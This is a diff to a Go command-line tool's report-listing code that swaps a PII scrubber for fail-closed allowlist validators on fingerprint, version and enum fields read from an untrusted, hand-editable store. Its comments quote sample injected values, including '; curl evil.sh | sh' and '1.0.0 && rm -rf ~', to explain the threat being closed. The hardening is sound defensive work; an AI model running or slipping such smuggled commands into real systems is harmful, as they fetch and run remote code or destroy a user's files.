@@ -16,17 +16,34 @@ package main
 //     derived open/regression/stale status (Req 5 / Req 3). With
 //     --resolve <fingerprint> [--version vX] it marks a report resolved.
 //
-// # Untrusted-corpus render (Req 7 / HC-4)
+// # Untrusted-corpus render (Req 7 / HC-4) — fail-closed shape validation
 //
-// The friction store holds only closed-set enum tokens + fingerprint +
-// version (Bead 2 journals enums-only), so most fields are structurally safe.
-// But Req 7 binds the RENDER surface: every field this command prints is run
-// through a defense-in-depth render scrub (renderField) that scrubs via
-// internal/redact, neutralises markdown auto-linking, strips control/newline
-// characters so no injected `recovery:` line can be auto-executed, and
-// length-caps. The output is code-fenced. This holds even though v1 emits no
-// free-text field — it is the explicit backstop the spec asks for, so a future
-// free-text field cannot regress the render contract.
+// The bead's threat model (Req 7 / HC-4) is that the STORE ITSELF is untrusted:
+// reports.jsonl can be HAND-EDITED, so a planted record can carry any bytes in
+// any field. Write-time normalization (the --resolve flag's
+// normalizeResolveVersion) is necessary but NOT sufficient — the RENDER path
+// must fail-closed too, because a value planted directly into reports.jsonl
+// never passes through the flag normalizer.
+//
+// Every field `report` / `report list` prints has a KNOWN CLOSED FORM, so each
+// is rendered through a fail-closed SHAPE VALIDATOR that emits the LITERAL
+// string `<redacted>` on ANY mismatch — NOT renderField (which is a PII scrubber
+// that PASSES unrecognized surrounding text, the leak that let
+// `<64hex>; curl evil.sh | sh` render as `<token>; curl <file> | sh` and a
+// planted `resolved_in_version="1.0.0 && rm -rf ~"` render verbatim):
+//
+//   - fingerprint (renderFingerprint): exact-64-lowercase-hex → verbatim
+//     (a self-generated hash is provably value-free), else `<redacted>`;
+//   - version fields (renderVersion: first/last/resolved_in_version): a value
+//     that the SAME normalizer the resolve flag uses accepts (a concrete semver
+//     canonicalized to bare major.minor.patch, or the explicit `dev` sentinel)
+//     → bare value, else `<redacted>`;
+//   - command / escape-hatch / subcommand (renderEnum): a member of the redact
+//     enum TOKEN SET → the token, else `<redacted>`.
+//
+// renderField (redact.Scrub + control-strip + length-cap) is retained as
+// DEFENSE-IN-DEPTH on top, but the closed-form validators are the PRIMARY gate:
+// the render emits NO shell metacharacter from ANY field for ANY planted store.
 //
 // # Store isolation (HC-3) — NO bd/dolt/git egress
 //
@@ -47,6 +64,7 @@ import (
 	"github.com/mrmaxsteel/mindspec/internal/config"
 	"github.com/mrmaxsteel/mindspec/internal/journal"
 	"github.com/mrmaxsteel/mindspec/internal/redact"
+	versionpkg "github.com/mrmaxsteel/mindspec/internal/version"
 )
 
 // inCI reports whether the process is running in a non-interactive CI
@@ -172,8 +190,11 @@ func runReportList(cmd *cobra.Command, _ []string) error {
 		if err := journal.MarkResolved(fp, ver); err != nil {
 			return fmt.Errorf("report list: %w", err)
 		}
+		// Echo through the closed-form validators (fail-closed to <redacted>):
+		// fp is a user-supplied fingerprint and ver a user-supplied version, so
+		// neither may carry a shell metacharacter into the copy-pasteable echo.
 		fmt.Fprintf(out, "report list: marked %s resolved_in %s\n",
-			renderField(fp), renderField(ver))
+			renderFingerprint(fp), renderVersion(ver))
 		return nil
 	}
 
@@ -197,18 +218,20 @@ func runReportList(cmd *cobra.Command, _ []string) error {
 		"FINGERPRINT", "COMMAND", "ESCAPE-HATCH", "STATUS", "COUNT", "VERSION-RANGE", "RESOLVED-IN")
 	for _, r := range reports {
 		status := r.Classify()
-		versionRange := renderField(r.FirstVersion)
+		// first/last version: closed-form (bare semver or `dev`) → bare value,
+		// else the literal `<redacted>`. A planted `1.0.0 && rm -rf ~` fails closed.
+		versionRange := renderVersion(r.FirstVersion)
 		if r.LastVersion != r.FirstVersion {
-			versionRange = renderField(r.FirstVersion) + ".." + renderField(r.LastVersion)
+			versionRange = renderVersion(r.FirstVersion) + ".." + renderVersion(r.LastVersion)
 		}
 		resolved := "-"
 		if r.ResolvedInVersion != "" {
-			resolved = renderField(r.ResolvedInVersion)
+			resolved = renderVersion(r.ResolvedInVersion)
 		}
 		fmt.Fprintf(out, "%-64s  %-10s  %-14s  %-12s  %5d  %-16s  %s\n",
 			renderFingerprint(r.Fingerprint),
-			renderField(r.Command),
-			renderField(r.EscapeHatch),
+			renderEnum(r.Command, redact.CommandTokens),
+			renderEnum(r.EscapeHatch, redact.EscapeHatchTokens),
 			string(status),
 			r.Count,
 			versionRange,
@@ -265,25 +288,27 @@ const fingerprintHexLen = 64
 // lowercase-hex SHA-256 of the normalized identity; it carries NO user value.
 //
 // The render surface is untrusted by contract (Req 7 / HC-4): a HAND-CRAFTED
-// reports.jsonl can plant an oversized / non-hex / control-laden `fingerprint`
-// value (codex-render-leak #1). The fix is SCRUB-FULL-THEN-DISPLAY with a
-// fail-closed allowlist on the shape:
+// reports.jsonl can plant an oversized / non-hex / control-laden / metachar-tail
+// `fingerprint` value (rp-render #2). The fingerprint has a KNOWN CLOSED FORM
+// (exactly 64 lowercase-hex chars), so it is a HARD fail-closed allowlist:
 //
-//   - if the FULL value is a well-formed fingerprint (exactly 64 lowercase-hex
-//     chars), it is rendered verbatim — it is a self-generated safe hash, so
-//     it bypasses the entropy catch-all (which would otherwise replace the
-//     high-entropy hex with `<token>` and make it unresolvable) while still
-//     being provably value-free;
-//   - ANYTHING else (oversized, non-hex, a planted prefix like
-//     `LEAKPREFIX123456`, control chars) is NOT a real fingerprint → it is run
-//     through the full renderField scrub, which fails closed to `<redacted>`
-//     for an unclassifiable/oversized value and NEVER emits a raw prefix.
+//   - exactly 64 lowercase-hex → rendered verbatim — a self-generated safe hash
+//     carrying no user value (it cannot encode a path/secret: no `/`, `:`, `@`,
+//     uppercase, g–z), shown in full so --resolve copy-paste works;
+//   - ANYTHING else (oversized, non-hex, a 64-hex prefix + planted tail like
+//     `<64hex>; curl evil.sh | sh`, control chars) is NOT a real fingerprint →
+//     the LITERAL `<redacted>`, NOT renderField(fp). renderField is a PII
+//     scrubber that PASSES unrecognized surrounding text, so it let the planted
+//     metachar tail ride alongside a scrubbed `<token>` prefix (rp-render #2);
+//     the slot is a self-generated hash or nothing, so there is no legitimate
+//     non-hex value to preserve readably.
 func renderFingerprint(fp string) string {
 	if isFingerprintHex(fp) {
 		return fp // a real, value-free hash — show it in full for --resolve
 	}
-	// Not a well-formed fingerprint: treat as untrusted, scrub + fail-closed.
-	return renderField(fp)
+	// Not a well-formed fingerprint: fail closed to a single literal token so no
+	// attacker-chosen text (metachars, paths, secrets) can ever ride alongside.
+	return "<redacted>"
 }
 
 // isFingerprintHex reports whether s is exactly a redact.Fingerprint digest:
@@ -301,6 +326,49 @@ func isFingerprintHex(s string) bool {
 		}
 	}
 	return true
+}
+
+// renderVersion is the fail-closed CLOSED-FORM validator for every version
+// field `report list` prints (first_version, last_version, resolved_in_version).
+// The render surface is untrusted by contract (Req 7 / HC-4): a HAND-EDITED
+// reports.jsonl can plant ANY bytes — e.g. `resolved_in_version="1.0.0 && rm
+// -rf ~"` — and that value reaches the render path WITHOUT passing the
+// --resolve flag's write-time normalizer, so the render must re-validate.
+//
+// A version has a KNOWN CLOSED FORM: a concrete semver (which version.Parse
+// accepts and we re-emit as bare major.minor.patch, discarding any
+// prerelease/build/`v` decoration AND any planted trailing metacharacter), or
+// the explicit `dev` sentinel (DQ4 unbounded-newest). This mirrors
+// journal.normalizeResolveVersion EXACTLY so the write-path and render-path
+// agree. ANY other value — a planted `1.0.0 && rm -rf ~`, a `$(...)`, a
+// backtick payload — renders the literal `<redacted>`, never the raw bytes.
+func renderVersion(v string) string {
+	v = strings.TrimSpace(v)
+	if v == "" {
+		return "-"
+	}
+	if sv, ok := versionpkg.Parse(v); ok {
+		// Re-emit bare canonical form: a decorated/suffixed/metachar-tailed input
+		// can only ever surface as `major.minor.patch`.
+		return fmt.Sprintf("%d.%d.%d", sv.Major, sv.Minor, sv.Patch)
+	}
+	if strings.EqualFold(v, "dev") || v == versionpkg.Current() {
+		return v
+	}
+	return "<redacted>"
+}
+
+// renderEnum is the fail-closed CLOSED-FORM validator for the closed-set enum
+// fields `report list` prints (command, escape-hatch, subcommand). Each is, by
+// the §Storage Contract, one of a fixed redact enum TOKEN SET. A HAND-EDITED
+// reports.jsonl can plant any string here, so the render emits the token ONLY
+// if it is a member of the allowlist, else the literal `<redacted>` — no
+// attacker-chosen free text (metachars, paths, secrets) can ever ride along.
+func renderEnum(s string, tokens map[string]struct{}) string {
+	if _, ok := tokens[s]; ok {
+		return s
+	}
+	return "<redacted>"
 }
 
 // stripControl removes ALL Unicode control characters so a multi-line or
